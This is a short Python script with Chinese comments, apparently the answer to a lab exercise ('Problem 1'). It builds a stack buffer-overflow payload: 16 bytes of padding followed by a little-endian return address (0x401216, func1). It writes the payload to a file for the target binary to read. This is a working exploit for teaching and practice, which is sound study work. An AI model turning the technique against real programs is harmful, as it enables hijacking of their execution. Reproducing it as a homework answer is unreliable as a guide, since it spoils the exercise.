import struct

# Problem 1 攻击脚本

# 1. 构造 Padding
# 缓冲区从 rbp-8 开始。
# 我们需要填充 8字节(buffer) + 8字节(saved rbp) = 16字节
padding_len = 16
padding = b'A' * padding_len

# 2. 构造目标地址
# func1 的地址是 0x401216
# <Q 代表 Little Endian (小端序), Unsigned Long Long (64位)
target_addr = struct.pack('<Q', 0x401216)

# 3. 组合 Payload
payload = padding + target_addr

# 4. 写入文件
# 题目要求 problem1 接收一个文件名参数
filename = "ans1.txt"
with open(filename, "wb") as f:
    f.write(payload)

print(f"[+] Payload 已写入 {filename}")
print(f"[+] Padding 长度: {padding_len}")
print(f"[+] 跳转目标: 0x401216 (func1)")
print("-" * 30)
print(f"请在终端运行: ./problem1 {filename}")
